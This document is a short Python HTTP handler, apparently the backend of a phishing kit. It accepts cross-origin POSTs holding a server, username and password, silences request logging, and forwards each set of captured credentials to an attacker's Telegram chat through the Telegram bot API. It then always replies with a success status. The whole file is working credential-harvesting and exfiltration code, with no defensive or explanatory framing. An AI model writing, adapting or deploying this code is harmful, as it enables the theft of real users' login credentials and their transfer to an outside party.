import os,json,urllib.request
from http.server import BaseHTTPRequestHandler
from datetime import datetime
def tg(t,c,m):
    r=urllib.request.Request(f"https://api.telegram.org/bot{t}/sendMessage",data=json.dumps({"chat_id":c,"text":m}).encode(),headers={"Content-Type":"application/json"})
    urllib.request.urlopen(r,timeout=10).read()
class handler(BaseHTTPRequestHandler):
    def log_message(self,f,*a):pass
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin","*")
        self.send_header("Access-Control-Allow-Methods","POST,OPTIONS")
        self.send_header("Access-Control-Allow-Headers","Content-Type")
        self.end_headers()
    def do_POST(self):
        tk=os.environ.get("TELEGRAM_BOT_TOKEN","")
        ci=os.environ.get("TELEGRAM_CHAT_ID","")
        try:
            n=int(self.headers.get("Content-Length") or 0)
            d=json.loads(self.rfile.read(n)) if n else {}
            m="LOG\nServer:{}\nUser:{}\nPass:{}\n{}".format(d.get("server","-"),d.get("username","-"),d.get("password","-"),datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        except Exception as e:
            m=f"ERROR:{e}"
        if tk and ci:
            try:tg(tk,ci,m);print("TG_OK")
            except Exception as e:print(f"TG_FAIL:{e}")
        self.send_response(200)
        self.send_header("Content-type","application/json")
        self.send_header("Access-Control-Allow-Origin","*")
        self.end_headers()
        self.wfile.write(b'{"status":"ok"}')
